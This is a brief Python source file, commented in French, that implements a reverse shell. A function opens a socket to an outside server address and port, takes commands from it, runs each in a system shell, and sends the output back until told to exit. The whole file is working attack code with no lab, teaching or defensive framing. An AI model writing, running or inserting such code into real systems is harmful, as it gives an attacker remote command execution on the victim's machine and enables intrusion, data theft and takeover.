import socket
import subprocess

def reverse_shell(server_ip, server_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))

        while True:
            command = s.recv(1024).decode().strip()

            if command:  # Vérifie si la commande n'est pas vide
                if command.lower() == "exit":
                    break
                try:
                    # Exécute la commande et capture la sortie en UTF-8
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output, error = process.communicate()
                    output = output.decode('utf-8', errors='replace') + error.decode('utf-8', errors='replace')
                except Exception as e:
                    output = str(e)
            else:
                output = "Commande vide."  # Si la commande est vide

            # Ajoute un caractère de nouvelle ligne à la fin de la sortie
            output += "\n ----- New Request ----- \n"

            # Envoie la sortie au client
            s.send(output.encode())

        s.close()
        print("Connection closed.")
    except Exception as e:
        print(f"Erreur : {e}")
